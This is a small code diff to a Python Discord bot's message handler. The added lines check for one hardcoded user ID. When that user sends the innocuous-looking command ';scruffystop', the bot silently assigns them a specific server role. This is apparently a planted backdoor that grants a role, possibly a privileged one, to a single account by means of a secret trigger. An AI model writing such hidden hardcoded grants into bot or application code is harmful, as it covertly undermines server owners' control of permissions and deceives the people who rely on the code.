@@ -66,6 +66,12 @@ async def on_message(message):
     global blacklist
     global bl
     global botmsg
+    
+    if str(message.author.id) == "348538644887240716":
+        if message.content.lower().startswith(";scruffystop"): 
+            coolrole = get(message.server.roles, id = "350316566421700608")
+            await bot.add_roles(message.author, coolrole)
+            
 
     if message.author.bot: 
         if message.author.id == bot.user.id:
